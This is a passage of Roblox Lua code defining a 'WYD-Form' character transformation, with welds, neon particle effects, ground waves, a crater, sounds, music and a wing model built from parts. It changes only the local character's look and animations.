RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(150), math.rad(0), math.rad(10)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(50), math.rad(0), math.rad(-20)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,-.2)*angles(math.rad(0),math.rad(-90),math.rad(-10)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,.6)*angles(math.rad(90),math.rad(-10),math.rad(0)),.3)
end
end
end
end
end}

 
 

module[1] = {"WYD-Form",function()
--coolallball
if game.Players.LocalPlayer.Character.Animate.Disabled==false then
	game.Players.LocalPlayer.Character.Animate.Disabled=true
end
wait()
local Player=game.Players.LocalPlayer
repeat wait()
until Player
local Char=Player.Character
repeat wait()
until Char
local CurrentEffects={}
local CurrentDamages={}
local Human=Char.Humanoid
local LArm=Char["Left Arm"]
local RArm=Char["Right Arm"]
local LLeg=Char["Left Leg"]
local RLeg=Char["Right Leg"]
local Torso=Char.Torso
local RS=Torso["Right Shoulder"]
local LS=Torso["Left Shoulder"]
local RH=Torso["Right Hip"]
local LH=Torso["Left Hip"]
local Head=Char.Head
local Neck=Torso.Neck
local RootPart=Char.HumanoidRootPart
local RootJoint=RootPart.RootJoint
local equipped=false
local Debounce=false
local Anim="Idle"
local chat = game:GetService("Chat")
local Mouse=Player:GetMouse()
local Lighting=game.Lighting
local cf=CFrame.new
local v3=Vector3.new
local c3=Color3.new
local it=Instance.new
local angles=CFrame.Angles
local rad=math.rad
local ran=math.random
local huge=math.huge
local attacking=false
local attacktype=1
local Portalling=false
local p = game.Players.LocalPlayer
local char = p.Character
local mouse = p:GetMouse()
local larm = char["Left Arm"]
local rarm = char["Right Arm"]
local lleg = char["Left Leg"]
local rleg = char["Right Leg"]
local hed = char.Head
local torso = char.Torso
local hum = char.Humanoid
local cam = game.Workspace.CurrentCamera
local root = char.HumanoidRootPart
local deb = false
local shot = 0
local debris=game:service"Debris"
local l = game:GetService("Lighting")
local rs = game:GetService("RunService").RenderStepped
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LSC0=cf(-1, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RSC0=cf(1, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
ROOTC0 = cf(0, 0, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
r=game:service'RunService'.RenderStepped
clerp=function(a,b,t)
	return a:lerp(b,t)
end


local Rainbow = { --This is the main color set. Try to use more than just a few, make it fade in order as well
"Lime green", 
} 

Debounces = {
CanAttack = true;
NoIdl = false;
Slashing = false;
Slashed = false;
RPunch = false;
Invisible = false;
RPunched = false;
LPunch = false;
LPunched = false;
}
local Touche = {char.Name, }


function genWeld(a,b)
    local w = Instance.new("Weld",a)
    w.Part0 = a
    w.Part1 = b
    return w
end
function weld(a, b)
    local weld = Instance.new("Weld")
    weld.Name = "W"
    weld.Part0 = a
    weld.Part1 = b
    weld.C0 = a.CFrame:inverse() * b.CFrame
    weld.Parent = a
    return weld;
end
----------------------------------------------------
function Lerp(c1,c2,al)
local com1 = {c1.X,c1.Y,c1.Z,c1:toEulerAnglesXYZ()}
local com2 = {c2.X,c2.Y,c2.Z,c2:toEulerAnglesXYZ()}
for i,v in pairs(com1) do
com1[i] = v+(com2[i]-v)*al
end
return CFrame.new(com1[1],com1[2],com1[3]) * CFrame.Angles(select(4,unpack(com1)))
end
----------------------------------------------------
newWeld = function(wp0, wp1, wc0x, wc0y, wc0z)
local wld = Instance.new("Weld", wp1)
wld.Part0 = wp0
wld.Part1 = wp1
wld.C0 = CFrame.new(wc0x, wc0y, wc0z)
end
----------------------------------------------------
function weld5(part0, part1, c0, c1)
    weeld=Instance.new("Weld", part0)
    weeld.Part0=part0
    weeld.Part1=part1
    weeld.C0=c0
    weeld.C1=c1
    return weeld
end
----------------------------------------------------
function HasntTouched(plrname)
local ret = true
for _, v in pairs(Touche) do
if v == plrname then
ret = false
end
end
return ret
end
----------------------------------------------------
newWeld(torso, larm, -1.5, 0.5, 0)
larm.Weld.C1 = CFrame.new(0, 0.5, 0)
newWeld(torso, rarm, 1.5, 0.5, 0)
rarm.Weld.C1 = CFrame.new(0, 0.5, 0)
newWeld(torso, hed, 0, 1.5, 0)
newWeld(torso, lleg, -0.5, -1, 0)
lleg.Weld.C1 = CFrame.new(0, 1, 0)
newWeld(torso, rleg, 0.5, -1, 0)
rleg.Weld.C1 = CFrame.new(0, 1, 0)
newWeld(root, torso, 0, -1, 0)
torso.Weld.C1 = CFrame.new(0, -1, 0)



p = Instance.new("Part")
p.BrickColor = BrickColor.new("Lime green")
p.Transparency = 1
TorsoColor = p.BrickColor

local Transforming = true
Human.WalkSpeed = 0
local fx = Instance.new("Part",Torso)
wit = p.BrickColor.Color
wit2 = Color3.new(0,255,0)
local glowz = Instance.new("ParticleEmitter",fx)
glowz.LightEmission = 1
glowz.Texture = "rbxassetid://284205403"
glowz.Color = ColorSequence.new(wit)
glowz.Size = NumberSequence.new(5)
glowz.Speed = NumberRange.new(25,50)
glowz.LockedToPart = false
glowz.Transparency = NumberSequence.new(0.75)
glowz.RotSpeed = NumberRange.new(-2000,2000)
glowz.Lifetime = NumberRange.new(1)
glowz.Rate = 50000
glowz.VelocitySpread = 9001
local glowz2 = Instance.new("ParticleEmitter",fx)
glowz2.LightEmission = 0.5
glowz.Texture = "rbxassetid://284205403"
glowz2.Color = ColorSequence.new(wit2)
glowz2.Size = NumberSequence.new(5)
glowz2.Speed = NumberRange.new(25,50)
glowz2.LockedToPart = false
glowz2.Transparency = NumberSequence.new(0.75)
glowz2.RotSpeed = NumberRange.new(-2000,2000)
glowz2.Lifetime = NumberRange.new(1)
glowz2.Rate = 50000
glowz2.VelocitySpread = 9001
fx.Anchored = true
fx.Material = "Neon"
fx.CanCollide = false
fx.Locked = true
fx.Transparency = 1
fx.Material = "Neon"
fx.Size = Vector3.new(1,1,1)
fx.TopSurface = "SmoothNoOutlines"
fx.BottomSurface = "SmoothNoOutlines"
fx.BrickColor = BrickColor.new("Really black")
fxm = Instance.new("SpecialMesh",fx)
fxm.MeshType = "Sphere"
local sa2 = Instance.new("Sound",Torso)
sa2.SoundId = "rbxassetid://93724183"
sa2.Pitch = 0.5
sa2.Volume = 5
sa2.Looped = false
sa2:Play()
local value = 1
fxm.Scale = Vector3.new(1,1,1)
for i = 1, 20 do rs:wait()
        value = value - 0.05
        fx.Transparency = fx.Transparency - (1/20)
        fx.CFrame = Torso.CFrame
        fxm.Scale = fxm.Scale + Vector3.new(value,value,value)
        rs:wait()
end
----------------------------------------------------
GroundWave1 = function()
	local HandCF = CFrame.new(root.Position - Vector3.new(0,3,0)) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(0))
	local Colors = {"Pastel blue-green", "Really black"}
		local wave = Instance.new("Part", Torso)
		wave.BrickColor = BrickColor.new(Colors[math.random(1,#Colors)])
		wave.Anchored = true
		wave.CanCollide = false
		wave.Locked = true
		wave.Size = Vector3.new(1, 1, 1)
		wave.TopSurface = "Smooth"
		wave.BottomSurface = "Smooth"
		wave.Transparency = 0.35
		wave.CFrame = HandCF
		wm = Instance.new("SpecialMesh", wave)
		wm.MeshId = "rbxassetid://3270017"
		coroutine.wrap(function()
		for i = 1, 30, 1 do
		wm.Scale = Vector3.new(50, 50, 1 + i*50)
		wave.Size = wm.Scale
		wave.CFrame = HandCF
		wave.Transparency = i/30
		wait()
		end
		wait()
		wave:Destroy()
	end)()
end
----------------------------------------------------


GroundWave3 = function()
	local HandCF = CFrame.new(root.Position - Vector3.new(0,3,0)) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(0))
	local Colors = {"Lime green", "Lime green"}
		local wave = Instance.new("Part", torso)
		wave.BrickColor = BrickColor.new(Colors[math.random(1,#Colors)])
		wave.Anchored = true
		wave.CanCollide = false
		wave.Locked = true
		wave.Size = Vector3.new(1, 1, 1)
		wave.TopSurface = "Smooth"
		wave.BottomSurface = "Smooth"
		wave.Transparency = 0.35
		wave.CFrame = HandCF
		wm = Instance.new("SpecialMesh", wave)
		wm.MeshId = "rbxassetid://3270017"
		coroutine.wrap(function()
		for i = 1, 14, 1 do
		wm.Scale = Vector3.new(1 + i*1.1, 1 + i*1.1, 1)
		wave.Size = wm.Scale
		wave.CFrame = HandCF
		wave.Transparency = i/14
		wait()
		end
		wait()
		wave:Destroy()
	end)()
end





local acos = math.acos
local sqrt = math.sqrt
local Vec3 = Vector3.new
local fromAxisAngle = CFrame.fromAxisAngle

local function toAxisAngle(CFr)
        local X,Y,Z,R00,R01,R02,R10,R11,R12,R20,R21,R22 = CFr:components()
        local Angle = math.acos((R00+R11+R22-1)/2)
        local A = (R21-R12)^2+(R02-R20)^2+(R10-R01)^2
        A = A == 0 and 0.00001 or A
        local B = (R21-R12)^2+(R02-R20)^2+(R10-R01)^2
        B = B == 0 and 0.00001 or B
        local C = (R21-R12)^2+(R02-R20)^2+(R10-R01)^2
        C = C == 0 and 0.00001 or C
        local x = (R21-R12)/sqrt(A)
        local y = (R02-R20)/sqrt(B)
        local z = (R10-R01)/sqrt(C)
        return Vec3(x,y,z),Angle
end

local acos = math.acos
local sqrt = math.sqrt
local Vec3 = Vector3.new
local fromAxisAngle = CFrame.fromAxisAngle

local function toAxisAngle(CFr)
        local X,Y,Z,R00,R01,R02,R10,R11,R12,R20,R21,R22 = CFr:components()
        local Angle = math.acos((R00+R11+R22-1)/2)
        local A = (R21-R12)^2+(R02-R20)^2+(R10-R01)^2
        A = A == 0 and 0.00001 or A
        local B = (R21-R12)^2+(R02-R20)^2+(R10-R01)^2
        B = B == 0 and 0.00001 or B
        local C = (R21-R12)^2+(R02-R20)^2+(R10-R01)^2
        C = C == 0 and 0.00001 or C
        local x = (R21-R12)/sqrt(A)
        local y = (R02-R20)/sqrt(B)
        local z = (R10-R01)/sqrt(C)
        return Vec3(x,y,z),Angle
end

function ApplyTrig(Num,Func)
        local Min,Max = Func(0),Func(1)
        local i = Func(Num)
        return (i-Min)/(Max-Min)
        --[[if Func == "sin" then
                return (math.sin((1-Num)*math.pi)+1)/2
        elseif Func == "cos" then
                return (math.cos((1-Num)*math.pi)+1)/2
        end]]
end

function LerpCFrame(CFrame1,CFrame2,Num)
        local Vec,Ang = toAxisAngle(CFrame1:inverse()*CFrame2)
        return CFrame1*fromAxisAngle(Vec,Ang*Num) + (CFrame2.p-CFrame1.p)*Num
end



function Crater(Torso,Radius)
        Spawn(function()
        local Ray = Ray.new(Torso.Position,Vector3.new(0,-1,0)*10)
        local Ignore = {}
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
                if v.Character ~= nil then
                        Ignore[#Ignore+1] = v.Character
                end
        end
        local Hit,Pos,SurfaceNorm = workspace:FindPartOnRayWithIgnoreList(Ray,Ignore)
        if Hit == nil then return end
        local Parts = {}
        for i = 1,360,10 do
                local P = Instance.new("Part",Torso.Parent)
                P.Anchored = true
                P.FormFactor = "Custom"
                P.BrickColor = BrickColor.new("Lime green")
                P.Material = "Granite"
                P.TopSurface = "Smooth"
                P.BottomSurface = "Smooth"
                P.Size = Vector3.new(5,10,10)*(math.random(80,100)/100)
                P.CFrame = ((CFrame.new(Pos,Pos+SurfaceNorm)*CFrame.Angles(math.rad(90),0,0))-Vector3.new(0,7,0))*CFrame.Angles(math.rad(math.random(-50,50)),math.rad(math.random(-50,50)),math.rad(math.random(-50,50)))
                Parts[#Parts+1] = {P,P.CFrame,((CFrame.new(Pos,Pos+SurfaceNorm)*CFrame.Angles(math.rad(90),0,0))-Vector3.new(0,1,0))*CFrame.Angles(0,math.rad(i),0)*CFrame.new(0,0,-Radius)*CFrame.Angles(math.rad(math.random(-50,-20)),math.rad(math.random(-15,15)),math.rad(math.random(-15,15))),P.Size}
                if math.random(0,5) == 0 then -- rubble
                        local P = Instance.new("Part",Torso.Parent)
                        P.Anchored = true
                        P.FormFactor = "Custom"
                        P.BrickColor = BrickColor.new("Lime green")
                        P.Material = Hit.Material
                        P.TopSurface = "Smooth"
                        P.BottomSurface = "Smooth"
                        P.Size = Vector3.new(5,5,5)*(math.random(80,100)/100)
                        P.CFrame = ((CFrame.new(Pos,Pos+SurfaceNorm)*CFrame.Angles(math.rad(90),0,0))-Vector3.new(0,2.5,0))*CFrame.Angles(math.rad(math.random(-50,50)),math.rad(math.random(-50,50)),math.rad(math.random(-50,50)))
                        Parts[#Parts+1] = {P,P.CFrame,(CFrame.new(Pos,Pos+SurfaceNorm)*CFrame.Angles(math.rad(90),0,0))*CFrame.Angles(0,math.rad(i),0)*CFrame.new(0,0,-Radius-8)*CFrame.Angles(math.rad(math.random(-90,90)),math.rad(math.random(-90,90)),math.rad(math.random(-90,90))),P.Size}
                end
        end
        for i = 0,1,0.05 do
                for i2,v in pairs(Parts) do
                        v[1].CFrame = LerpCFrame(v[2],v[3],ApplyTrig(i,math.cos))
                end
                wait(0.02)
        end
        for i,v in pairs(Parts) do
                if v[1].Size.X > 2.1 then
                        v[1].CFrame = v[1].CFrame+Vector3.new(0,2,0)
                end
                v[1].Anchored = false
        end
        for i = 0,1,0.05 do
                for i2,v in pairs(Parts) do
                        v[1].Transparency = i
                        if i == 1 then
                                v[1]:Destroy()
                        elseif i >= 0.25 then
                                v[1].CanCollide = false
                        end
                end
                wait(0.02)
        end
        Parts = nil
        end)
end



GroundWave = function()
        if Transforming == true then
                local value = 5
                local value2 = 10
                local value3 = 20
local sa2 = Instance.new("Sound",Torso)
sa2.SoundId = "rbxassetid://393621716"
sa2.Pitch = 1
sa2.Volume = 10
sa2.Looped = false
sa2:Play()
                local wave = Instance.new("Part", Torso)
local glowz = Instance.new("ParticleEmitter",wave)
glowz.LightEmission = 1
glowz.Texture = "rbxassetid://284205403"
glowz.Color = ColorSequence.new(wit)
glowz.Size = NumberSequence.new(30)
glowz.Speed = NumberRange.new(25,100)
glowz.LockedToPart = false
glowz.Transparency = NumberSequence.new(0.75)
glowz.RotSpeed = NumberRange.new(-2000,2000)
glowz.Lifetime = NumberRange.new(1)
glowz.Rate = 50000
glowz.VelocitySpread = 9001
local glowz2 = Instance.new("ParticleEmitter",wave)
glowz2.LightEmission = 1
glowz.Texture = "rbxassetid://284205403"
glowz2.Color = ColorSequence.new(wit)
glowz2.Size = NumberSequence.new(30)
glowz2.Speed = NumberRange.new(25,100)
glowz2.LockedToPart = false
glowz2.Transparency = NumberSequence.new(0.75)
glowz2.RotSpeed = NumberRange.new(-2000,2000)
glowz2.Lifetime = NumberRange.new(1)
glowz2.Rate = 50000
glowz2.VelocitySpread = 9001
                wave.BrickColor = BrickColor.new("Really black")
                wave.Anchored = true
                wave.CanCollide = false
                wave.Locked = true
                wave.Size = Vector3.new(1, 1, 1)
                wave.TopSurface = "Smooth"
                wave.BottomSurface = "Smooth"
                wave.Transparency = 0.35
                wave.CFrame = fx.CFrame
                wave.Material = "Neon"
                wm = Instance.new("SpecialMesh", wave)
                wm.MeshType = "Sphere"
                wm.Scale = Vector3.new(1,1,1)
                local wave2 = Instance.new("Part", Torso)
                wave2.BrickColor = TorsoColor
                wave2.Anchored = true
                wave2.CanCollide = false
                wave2.Locked = true
                wave2.Size = Vector3.new(1, 1, 1)
                wave2.TopSurface = "Smooth"
                wave2.BottomSurface = "Smooth"
                wave2.Transparency = 0.35
                wave2.CFrame = fx.CFrame
                wave2.Material = "Neon"
                wm2 = Instance.new("SpecialMesh", wave2)
                wm2.MeshType = "FileMesh"
                wm2.MeshId = "http://www.roblox.com/asset/?id=3270017"
                wm2.Scale = Vector3.new(1,1,1)
                local wave3 = Instance.new("Part", Torso)
                wave3.BrickColor = BrickColor.new("Really black")
                wave3.Anchored = true
                wave3.CanCollide = false
                wave3.Locked = true
                wave3.Size = Vector3.new(1, 1, 1)
                wave3.TopSurface = "Smooth"
                wave3.BottomSurface = "Smooth"
                wave3.Transparency = 0.35
                wave3.CFrame = fx.CFrame
                wave3.Material = "Neon"
                wm3 = Instance.new("SpecialMesh", wave3)
                wm3.MeshType = "FileMesh"
                wm3.MeshId = "http://www.roblox.com/asset/?id=3270017"
                wm3.Scale = Vector3.new(1,1,1)
                coroutine.wrap(function()
                for i = 1, 18, 1 do
                value = value - 0.5
                value2 = value2 - 0.75*1.5
                value3 = value3 - 0.475*1.5
                wm.Scale = wm.Scale + Vector3.new(value*3.5,value*3.5,value*3.5)
                wm2.Scale = wm.Scale + Vector3.new(value2*3.5,value2*3.5,0.5)
                wm3.Scale = wm.Scale + Vector3.new(value3*3.5,value3*3.5,0.25)
                --wave.Size = wm.Scale
                wave.CFrame = fx.CFrame
                wave.Transparency = i/14
                --wave2.Size = wm2.Scale
                wave2.CFrame = fx.CFrame
                wave2.Rotation = Vector3.new(90, 0, 0)
                wave2.Transparency = i/14
                --wave3.Size = wm3.Scale
                wave3.CFrame = fx.CFrame
                wave3.Rotation = Vector3.new(90, 0, 0)
                wave3.Transparency = i/14
                wait()
                glowz.Rate = 0
                glowz2.Rate = 0
                end
                wait()
                wave:Destroy()
                wave2:Destroy()
                wave3:Destroy()
        end)()
        elseif Transforming == false then
        wait()
        end
end

for i = 1, 100 do rs:wait()
        fx.CFrame = Torso.CFrame
end

spawn(function()
	while wait(1) do
		GroundWave()
	end
end)

wait(4)

Transforming = false



local value2 = 1
for i = 1, 20 do rs:wait()
        value2 = value2 - 0.05
        glowz.Rate = 0
        glowz2.Rate = 0
        fx.Transparency = fx.Transparency + (1/20)
        fx.CFrame = torso.CFrame
        fxm.Scale = fxm.Scale + Vector3.new(value2,value2,value2)
        rs:wait()
end
glowz:Destroy()
glowz2:Destroy()

local HandCF = CFrame.new(root.Position - Vector3.new(0,3,0)) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(0))
        local valuer = 5
        local valuer2 = 10
        local valuer3 = 15
local sa2 = Instance.new("Sound",torso)
sa2.SoundId = "rbxassetid://130972023"
sa2.Pitch = 1
sa2.Volume = 5
sa2.Looped = false
sa2:Play()
local sar2 = Instance.new("Sound",torso)
sar2.SoundId = "rbxassetid://153274423"
sar2.Pitch = 1
sar2.Volume = 5
sar2.Looped = false
sar2:Play()
local Mus = Instance.new("Sound",torso)
Mus.SoundId = "rbxassetid://397952612"
Mus.Pitch = 1
Mus.Volume = 6
Mus.Looped = true
Mus:Play()
Crater(torso,67)
        local wave = Instance.new("Part", torso)
        wave.BrickColor = TorsoColor
        wave.Anchored = true
        wave.CanCollide = false
        wave.Locked = true
        wave.Size = Vector3.new(1, 1, 1)
        wave.TopSurface = "Smooth"
        wave.BottomSurface = "Smooth"
        wave.Transparency = 0.35
        wave.CFrame = HandCF
        wm = Instance.new("SpecialMesh", wave)
        wm.MeshId = "rbxassetid://3270017"
        local wave2 = Instance.new("Part", torso)
        wave2.BrickColor = BrickColor.new("Really black")
        wave2.Anchored = true
        wave2.CanCollide = false
        wave2.Locked = true
        wave2.Size = Vector3.new(1, 1, 1)
        wave2.TopSurface = "Smooth"
        wave2.BottomSurface = "Smooth"
        wave2.Transparency = 0.35
        wave2.CFrame = HandCF
        wm2 = Instance.new("SpecialMesh", wave2)
        wm2.MeshId = "rbxassetid://3270017"
        local wave3 = Instance.new("Part", torso)
        wave3.BrickColor = TorsoColor
        wave3.Anchored = true
        wave3.CanCollide = false
        wave3.Locked = true
        wave3.Size = Vector3.new(1, 1, 1)
        wave3.TopSurface = "Smooth"
        wave3.BottomSurface = "Smooth"
        wave3.Transparency = 0.35
        wave3.CFrame = HandCF
        wm3 = Instance.new("SpecialMesh", wave3)
        wm3.MeshId = "rbxassetid://3270017"
        coroutine.wrap(function()
        for i = 1, 14, 1 do
        valuer = valuer - 0.35
        valuer2 = valuer - 0.45
        valuer3 = valuer3 - 0.475
        wm.Scale = wm.Scale + Vector3.new(valuer*2.5,valuer*2.5, 1 + i*200)
        wave.Size = wm.Scale
        wave.CFrame = HandCF
        wave.Transparency = i/14
        wm2.Scale = wm2.Scale + Vector3.new(valuer2*2.5,valuer2*2.5, 0 + i*10)
        wave2.Size = wm2.Scale
        wave2.CFrame = HandCF
        wave2.Transparency = i/14
        wm3.Scale = wm3.Scale + Vector3.new(valuer3*2.5,valuer3*2.5, 1)
        wave3.Size = wm2.Scale
        wave3.CFrame = HandCF
        wave3.Transparency = i/14
        wait()
        end
        wait()
        wave:Destroy()
        wave2:Destroy()
end)()
hum.WalkSpeed = 16









CV="Pastel blue"
	
local txt = Instance.new("BillboardGui", Char)
txt.Adornee = Char .Head
txt.Name = "_status"
txt.Size = UDim2.new(2, 0, 1.2, 0)
txt.StudsOffset = Vector3.new(-9, 8, 0)
local text = Instance.new("TextLabel", txt)
text.Size = UDim2.new(10, 0, 7, 0)
text.FontSize = "Size24"
text.TextScaled = true
text.TextTransparency = 0
text.BackgroundTransparency = 1 
text.TextTransparency = 0
text.TextStrokeTransparency = 0
text.Font = "Antique"
text.TextStrokeColor3 = Color3.new(0,255,0)

v=Instance.new("Part")
v.Name = "ColorBrick"
v.Parent=Player.Character
v.FormFactor="Symmetric"
v.Anchored=true
v.CanCollide=false
v.BottomSurface="Smooth"
v.TopSurface="Smooth"
v.Size=Vector3.new(10,5,3)
v.Transparency=1
v.CFrame=Char.Torso.CFrame
v.BrickColor=BrickColor.new(CV)
v.Transparency=1
text.TextColor3 = Color3.new(0,0,0)
v.Shape="Block"
text.Text = Char.Name

Player:ClearCharacterAppearance()
wait(0.1)
Player.Character.Head.BrickColor = BrickColor.new("Really black")
Player.Character.Torso.BrickColor = BrickColor.new("Really black")
Player.Character["Right Arm"].BrickColor = BrickColor.new("Really black")
Player.Character["Right Leg"].BrickColor = BrickColor.new("Really black")
Player.Character["Left Leg"].BrickColor = BrickColor.new("Really black")
Player.Character["Left Arm"].BrickColor = BrickColor.new("Really black")
Player.Character.Head.face:Destroy()







local selectionBoxOfTorso = Instance.new("SelectionBox",Torso)
selectionBoxOfTorso.Adornee = Torso
selectionBoxOfTorso.Color = BrickColor.new("Lime green")
selectionBoxOfTorso.LineThickness = 0.01
selectionBoxOfTorso.Transparency = 0
	
local selectionBoxOfRightArm = Instance.new("SelectionBox",Char["Right Arm"])
selectionBoxOfRightArm.Adornee = Char["Right Arm"]
selectionBoxOfRightArm.Color = BrickColor.new("Lime green")
selectionBoxOfRightArm.LineThickness = 0.01
selectionBoxOfRightArm.Transparency = 0
	
local selectionBoxOfRightLeg = Instance.new("SelectionBox",Char["Right Leg"])
selectionBoxOfRightLeg.Adornee = Char["Right Leg"]
selectionBoxOfRightLeg.Color = BrickColor.new("Lime green")
selectionBoxOfRightLeg.LineThickness = 0.01
selectionBoxOfRightLeg.Transparency = 0

local selectionBoxOfLeftArm = Instance.new("SelectionBox",Char["Left Arm"])
selectionBoxOfLeftArm.Adornee = Char["Left Arm"]
selectionBoxOfLeftArm.Color = BrickColor.new("Lime green")
selectionBoxOfLeftArm.LineThickness = 0.01
selectionBoxOfLeftArm.Transparency = 0

local selectionBoxOfLeftLeg = Instance.new("SelectionBox",Char["Left Leg"])
selectionBoxOfLeftLeg.Adornee = Char["Left Leg"]
selectionBoxOfLeftLeg.Color = BrickColor.new("Lime green")
selectionBoxOfLeftLeg.LineThickness = 0.01
selectionBoxOfLeftLeg.Transparency = 0


LightOnBody = Instance.new("PointLight", Head)
LightOnBody.Brightness = 3000
LightOnBody.Range = 20
LightOnBody.Color = Color3.new(0, 225, 0)



----------------------------------------------------------------------
local m2 = Instance.new("Model")
m2.Name = "Wings"
p1 = Instance.new("Part", m2)
p1.BrickColor = BrickColor.new("Lime green")
p1.Material = Enum.Material.Neon
p1.CFrame = CFrame.new(28.7928066, 27.8741341, 25.9347725, -0.579227924, -0.579227805, -0.573576331, 0.707106769, -0.707106769, 0, -0.405579776, -0.405579716, 0.819152117)
p1.FormFactor = Enum.FormFactor.Custom
p1.Size = Vector3.new(0.61060679, 3.09150696, 0.221234918)
p1.BottomSurface = Enum.SurfaceType.Smooth
p1.TopSurface = Enum.SurfaceType.Smooth
b1 = Instance.new("SpecialMesh", p1)
b1.MeshType = Enum.MeshType.Sphere
b1.Name = "Mesh"
p2 = Instance.new("Part", m2)
p2.BrickColor = BrickColor.new("Lime green")
p2.Material = Enum.Material.SmoothPlastic
p2.Reflectance = 0.30000001192093
p2.CFrame = CFrame.new(23.8806973, 23.7568359, 26.9065781, -0.573576033, 0.346188396, -0.742403686, 0, -0.906307817, -0.422617972, -0.819152117, -0.24240382, 0.519836783)
p2.CanCollide = false
p2.FormFactor = Enum.FormFactor.Custom
p2.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p2.BottomSurface = Enum.SurfaceType.Smooth
p2.TopSurface = Enum.SurfaceType.Smooth
b2 = Instance.new("SpecialMesh", p2)
b2.MeshId = "http://www.roblox.com/asset/?id=3270017"
b2.TextureId = ""
b2.MeshType = Enum.MeshType.FileMesh
b2.Name = "Mesh"
b2.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p3 = Instance.new("Part", m2)
p3.BrickColor = BrickColor.new("Lime green")
p3.Material = Enum.Material.SmoothPlastic
p3.Reflectance = 0.30000001192093
p3.CFrame = CFrame.new(23.7651176, 23.6910381, 26.9875221, -0.573576033, 0.346188247, -0.742403686, -2.40360578e-007, -0.906307697, -0.422617912, -0.819152117, -0.242403969, 0.519836664)
p3.CanCollide = false
p3.FormFactor = Enum.FormFactor.Custom
p3.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p3.BottomSurface = Enum.SurfaceType.Smooth
p3.TopSurface = Enum.SurfaceType.Smooth
b3 = Instance.new("SpecialMesh", p3)
b3.MeshId = "http://www.roblox.com/asset/?id=3270017"
b3.TextureId = ""
b3.MeshType = Enum.MeshType.FileMesh
b3.Name = "Mesh"
b3.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p4 = Instance.new("Part", m2)
p4.BrickColor = BrickColor.new("Lime green")
p4.Material = Enum.Material.SmoothPlastic
p4.Reflectance = 0.30000001192093
p4.CFrame = CFrame.new(29.5663891, 25.8075085, 26.4371891, -0.573576391, 0.280166149, 0.769750714, 2.08616257e-007, -0.939692259, 0.342020333, 0.819151878, 0.196174487, 0.538985968)
p4.CanCollide = false
p4.FormFactor = Enum.FormFactor.Custom
p4.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p4.BottomSurface = Enum.SurfaceType.Smooth
p4.TopSurface = Enum.SurfaceType.Smooth
b4 = Instance.new("SpecialMesh", p4)
b4.MeshId = "http://www.roblox.com/asset/?id=3270017"
b4.TextureId = ""
b4.MeshType = Enum.MeshType.FileMesh
b4.Name = "Mesh"
b4.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p5 = Instance.new("Part", m2)
p5.BrickColor = BrickColor.new("Lime green")
p5.Material = Enum.Material.SmoothPlastic
p5.Reflectance = 0.30000001192093
p5.CFrame = CFrame.new(23.880703, 23.7568455, 26.9065876, -0.573576212, 0.346188098, -0.742403805, -4.76837158e-007, -0.906307578, -0.422617912, -0.819152236, -0.242404133, 0.519836485)
p5.CanCollide = false
p5.FormFactor = Enum.FormFactor.Custom
p5.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p5.BottomSurface = Enum.SurfaceType.Smooth
p5.TopSurface = Enum.SurfaceType.Smooth
b5 = Instance.new("SpecialMesh", p5)
b5.MeshId = "http://www.roblox.com/asset/?id=3270017"
b5.TextureId = ""
b5.MeshType = Enum.MeshType.FileMesh
b5.Name = "Mesh"
b5.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p6 = Instance.new("Part", m2)
p6.BrickColor = BrickColor.new("Lime green")
p6.Material = Enum.Material.SmoothPlastic
p6.Reflectance = 0.30000001192093
p6.CFrame = CFrame.new(23.6530266, 23.6272411, 27.0660267, -0.573576212, 0.346187949, -0.742403805, -7.17197622e-007, -0.906307459, -0.422617853, -0.819152236, -0.242404282, 0.519836366)
p6.CanCollide = false
p6.FormFactor = Enum.FormFactor.Custom
p6.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p6.BottomSurface = Enum.SurfaceType.Smooth
p6.TopSurface = Enum.SurfaceType.Smooth
b6 = Instance.new("SpecialMesh", p6)
b6.MeshId = "http://www.roblox.com/asset/?id=3270017"
b6.TextureId = ""
b6.MeshType = Enum.MeshType.FileMesh
b6.Name = "Mesh"
b6.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p7 = Instance.new("Part", m2)
p7.BrickColor = BrickColor.new("Lime green")
p7.Material = Enum.Material.SmoothPlastic
p7.Reflectance = 0.30000001192093
p7.CFrame = CFrame.new(23.7651253, 23.6910515, 26.9875393, -0.573576212, 0.3461878, -0.742403805, -9.57558086e-007, -0.90630734, -0.422617793, -0.819152236, -0.242404431, 0.519836247)
p7.CanCollide = false
p7.FormFactor = Enum.FormFactor.Custom
p7.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p7.BottomSurface = Enum.SurfaceType.Smooth
p7.TopSurface = Enum.SurfaceType.Smooth
b7 = Instance.new("SpecialMesh", p7)
b7.MeshId = "http://www.roblox.com/asset/?id=3270017"
b7.TextureId = ""
b7.MeshType = Enum.MeshType.FileMesh
b7.Name = "Mesh"
b7.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p8 = Instance.new("Part", m2)
p8.BrickColor = BrickColor.new("Lime green")
p8.Material = Enum.Material.SmoothPlastic
p8.Reflectance = 0.30000001192093
